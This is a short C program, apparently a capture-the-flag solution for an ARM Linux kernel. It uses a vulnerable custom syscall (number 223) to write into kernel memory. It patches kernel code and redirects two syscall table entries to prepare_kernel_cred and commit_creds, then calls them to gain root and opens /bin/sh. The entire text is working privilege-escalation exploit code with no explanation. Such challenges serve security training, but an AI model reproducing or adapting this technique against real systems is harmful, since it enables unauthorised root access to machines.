#define SYS_CALL_TABLE 0x8000e348
// prepare_kernel_cred 8003f924
// commit_creds 8003f56c
// syscall number reference: https://chromium.googlesource.com/native_client/nacl-newlib/+/master/libgloss/arm/linux-syscall.h
unsigned int **sct;

int main() {
        sct = (unsigned int**)SYS_CALL_TABLE;

        syscall(223, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", 0x8003f560);
        syscall(223, "\x24\xf9\x03\x80", sct+34);
        syscall(223, "\x60\xf5\x03\x80", sct+50);
        syscall(50, syscall(34, 0));
        system("/bin/sh");
        return 0;
}
